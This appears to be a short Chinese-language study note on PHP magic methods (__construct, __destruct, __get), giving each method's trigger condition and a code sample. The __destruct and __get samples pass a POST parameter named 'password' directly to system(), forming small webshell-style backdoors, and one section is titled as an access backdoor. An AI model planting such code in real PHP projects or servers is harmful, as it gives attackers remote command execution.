---
date: 2024-03-27 16:46:33
---

# php魔术方法

## __construct()——构造方法

触发条件：在对象实例化的时候自动触发

```
red  
<?php  
  
class test1{  
    function post() {  
        return $_POST['password'];  
    }  
}  
class test2 extends test1 {  
    public $code;  
    function __construct()  
    {  
        echo "<br>"."调用成功"."<br>";  
        $this->code = parent::post();  
    }  
    public function getcode()  
    {  
        return $this->code;  
    }  
}  
$fff = new test2;  
$zzz = new test1;  
echo($fff->getcode()); //将post方法传递出来

?>
```

## __destruct()——析构方法

触发条件：在销毁对象的时候自动触发（配合unset使用）

```
red  
<?php  
  
class test1{  
    function post() {  
        return $_POST['password'];  
    }  
}  
class test2 extends test1 {  
  
    function __destruct()  
    {  
        echo "<br>"."调用成功"."<br>";  
        $code = parent::post();  
        system($code);  
    }  
}  
$fff = new test2;  
unset($fff);  
  
?>
```

## __get()——访问后门

触发条件：访问私有类成员属性的时候自动触发

```
red  
<?php  
  
class test1{  
    function post() {  
        return $_POST['password'];  
    }  
}  
class test2 extends test1 {  
    private $a = 1;  
    function __get($a)  
    {  
        echo "<br>"."调用成功"."<br>";  
        $code = parent::post();  
        system($code);  
    }  
} 

$fff = new test2;
echo $fff -> a;

?>
```